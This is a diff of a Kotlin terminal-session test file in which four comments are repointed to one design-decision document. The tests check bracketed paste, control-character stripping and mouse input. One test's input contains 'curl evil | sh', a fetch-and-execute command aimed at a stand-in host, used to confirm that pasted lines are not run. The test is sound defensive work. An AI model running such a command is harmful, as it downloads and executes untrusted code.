@@ -540,7 +540,7 @@ class TerminalSessionTest {
 
     @Test
     fun textOfSeveralLinesThatTheImeCommitsIsBracketedLikeAPaste() {
-        // Gboard commits a clipboard suggestion with commitText (docs/decisions/0050).
+        // Gboard commits a clipboard suggestion with commitText (docs/decisions/0082).
         feed("\u001b[?2004h")
         session.edit { it.commitText("echo hi\ncurl evil | sh\n") }
         assertEquals("\u001b[200~echo hi\rcurl evil | sh\r\u001b[201~", sent.toString())
@@ -549,7 +549,7 @@ class TerminalSessionTest {
     @Test
     fun theTrailingLineFeedOfAClipboardSuggestionDoesNotRunThePastedLines() {
         // What Gboard 18.4 calls when the user taps a clipboard suggestion of several lines that
-        // ends with a line feed (docs/decisions/0064).
+        // ends with a line feed (docs/decisions/0082).
         feed("\u001b[?2004h")
         session.edit {
             it.beginBatchEdit()
@@ -572,7 +572,7 @@ class TerminalSessionTest {
 
     @Test
     fun controlsInTheAppsTextAreRemoved() {
-        // As its KDoc says; Esc is sent with sendKey (docs/decisions/0057).
+        // As its KDoc says; Esc is sent with sendKey (docs/decisions/0082).
         session.sendText("\u001b:wq\t\r")
         assertEquals(":wq\t\r", sent.toString())
     }
@@ -740,7 +740,7 @@ class TerminalSessionTest {
 
     @Test
     fun aMousePressSendsTheComposingTextFirstAndResets() {
-        // A click can move the host's cursor, as in vim's insert mode (docs/decisions/0057).
+        // A click can move the host's cursor, as in vim's insert mode (docs/decisions/0082).
         feed("\u001b[?1000h")
         session.edit { it.commitText("ab") }
         session.edit { it.setComposingText("か") }
